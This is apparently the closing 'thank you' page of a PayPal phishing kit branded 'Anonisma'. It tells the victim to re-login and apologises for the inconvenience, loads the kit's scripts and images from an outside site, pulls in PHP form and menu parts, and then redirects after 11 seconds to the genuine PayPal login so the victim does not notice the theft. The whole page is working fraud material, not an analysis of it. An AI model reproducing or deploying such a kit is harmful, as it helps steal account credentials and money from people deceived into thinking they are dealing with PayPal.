



<!DOCTYPE html>

<html lang="es_ES">
  

<head>

      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
     

      <title>Thanks, Your account has been...</title>
	  <meta http-equiv="refresh" content="11;url=https://www.paypal.com/login">
      <script src="./AA-NN-OO-NN-II-SS-MM-AA/anonis.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/Anoonisma.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/Anonisma-input.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/main2.js" type="text/javascript" charset="utf-8"></script>
	  <link rel="icon" type="image/x-icon" href="http://niceshopweb.com/7+/An-on-is-ma/hooool.ico">
      <style type="text/css"></style>
	

  </head>
   <body>

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
<body>
     
	 
	 <? include ("./head/menu.php"); ?>
	
	
	
	
	
	
	
	
	
	
	
	
    <div class="notisma">
      <div id="Anonismaaaaaaaaaa" class="modal fade " >
        <div class="modisma">
          <div class="modisma-com">
		  
		  
         
			
			
            <ul class="meknasi"></ul>
            <div class="sa7ra-maghribiya hidden-phone"></div>
          </div>
        </div>
      </div>
    </div>
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
    <div class="con-ismas contisma" id="contisma" role="main" >
      <div id="Anonismaaaaaaaaaaaaaaaaaaaaaaaa" class="maincontisma sumisma">
        <h1 id="heading1" class="ismad">Anonisma: Opciones</h1>
        <div class="Anonismaaaaaaaaaaaaaaaaaaaaaaaa">
          
		  
		  
		  <div class="Anoniiiiismaaaaaaa">
            <div class="Anoniiiiismaaaaa">
              
			  
			  
			<div class="inismaaaaaaaaaaaa">
                              <img WIDTH=85 HEIGHT=85  src="http://niceshopweb.com/7+/An-on-is-ma/wa7dd.png" > 
							</div>
			  
			  
			  
              <div class="mgharbaaaaaaaaaaaa">
                
				<div class="name"><span class="maghrib-zwin">Thanks, Now you have to re-login <img  src="http://niceshopweb.com/22/fot/5555.png" width="30" height="30" ></a></span>
				
				<a class="edit hover" href="thanks.php" name="editName" role="button">Edit</a></div>
                <p class="since sa7raa-maghriibiya">Sorry for the inconvenience. &nbsp; &nbsp; &nbsp; </p>
				
				
				
              </div>
            </div>
   
		  </div>
					
				
		  
		  
		  
		  
		 
		 
		 
		 
		 
		 
		 






		 
		  
		  
		  
          <? include ("./head/barra-3.php"); ?>
		  
		  
		  
		 










		 
		  
		  
		  
		  
		 


		 </br>
		  
		


</br>


<? include ("./form/formulario-3.php"); ?>
				
				
			
			
			
			
			
			

					
       
          </div>
        </div>
      </div>
    </div>
	
	</br>
	</br>

	
	
	
<? include ("./head/footer.php"); ?>

	

	
	

      </object>
    </div>
  </body>
</html>